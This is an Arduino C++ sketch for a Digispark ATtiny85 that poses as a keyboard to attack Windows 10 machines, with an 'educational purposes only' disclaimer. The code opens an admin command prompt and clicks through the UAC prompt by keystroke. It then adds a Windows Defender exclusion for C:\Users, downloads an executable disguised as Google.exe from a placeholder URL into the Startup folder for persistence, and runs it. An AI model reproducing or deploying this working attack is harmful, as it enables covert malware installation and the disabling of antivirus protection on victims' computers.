/*C++

Author: Mak7uSZ


Description:        This arduino sketch uses the Digispark Attiny85 DigiKeyboard library 
                    to carry out a HID attack on a Windows 10 machine. The attack consists of 
                    disabling Windows Security settings for "Real-Time Monitoring"  Bypassing UAC 
                    and launching an admin command prompt. Then passing commands to the prompt to download 
                    the payload, add exclusions in virus and security for the payload attempts to further
                    disarm Windows then with taskscheduler schedule our payload to start.
                    
Disclaimer:         This is open source from https://github.com/graylagx2 and is intended only for educational
                    purposes. Use in a controlled environment only. By using this sofware you agree you are 
                    responsible for any laws you break.   
                    
Warning:            Line number 112 requires you to change the download web address. Further all file paths are set to
                    example: "C:\\Program Files (x86)\\MicrosoftLagService.zip". Take note of these paths or modify as needed.
                    Inspect the registry edits this script performs you may not need them all.

*/

#include <DigiKeyboard.h>

// Some extra keys for the Keyboard we will need
#define KEY_ESC     41
#define KEY_LEFT_ARROW 0x50
#define KEY_DELETE  0x2A   
#define KEY_TAB     43
#define KEY_SPACE   44

void setup() {
  // There is not setup needed to use the DigiKeyboard
}

/*
!!  DigiKeyboard.sendKeyStroke are in reverse order  !!
*/
// A small function to make pressing enter easier
void enum_enter() {
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);
}

// A function to bypass user account controls
void bypass_UAC() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("powershell Start-Process cmd -Verb runAs"));
  DigiKeyboard.delay(500);
  enum_enter();
  DigiKeyboard.delay(12000);
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(1000);
  enum_enter();
  DigiKeyboard.delay(1000);
}
//add an exlusion path to users folder (windows defender will not scan it)
void commands() {
  DigiKeyboard.print(F("powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '"));
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.print(F("C:\\Users'"));  
  enum_enter();  
  // Download the payload(file)                                  -- change me --
  DigiKeyboard.print(F("powershell Invoke-WebRequest 'https://github.com/*******/********/raw/main/Google.exe' -Outfile '"));
  DigiKeyboard.print(F("C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Google.exe'"));//path to startup to file restart everytime after restarting pc
  enum_enter();  
  DigiKeyboard.delay(5000);
  
  DigiKeyboard.print(F("cd C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"));//go to the path
  enum_enter();
  DigiKeyboard.print(F("start Google.exe"));//run the file
  enum_enter();

   DigiKeyboard.delay(5000);
  DigiKeyboard.print(F("exit"));  //exit the terminal
  enum_enter();  
}

void loop() {
  // This is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

// Calling the functions from above
  
  bypass_UAC();  

  commands();

  // The cheesy way to stop the loop
  exit(0);
}
